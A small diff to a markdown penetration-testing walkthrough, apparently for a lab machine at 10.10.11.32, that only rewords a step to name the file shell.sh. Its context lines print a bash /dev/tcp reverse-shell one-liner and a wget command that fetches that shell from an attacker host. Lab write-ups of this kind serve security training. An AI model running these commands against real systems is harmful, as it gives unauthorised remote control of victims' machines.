@@ -228,7 +228,7 @@ __1.__ `First` - Create a one liner reverse shell
 bash -i >& /dev/tcp/<Attacker IP>/<Attacker Listener Port> 0>&1
 ```
 
-__2.__ `Second` - Transfer this shell to victim machine (`10.10.11.32`)
+__2.__ `Second` - Transfer this reverse shell (`shell.sh`) to victim machine (`10.10.11.32`)
 
 ```bash
  wget http://<Attacker IP address>/shell.sh
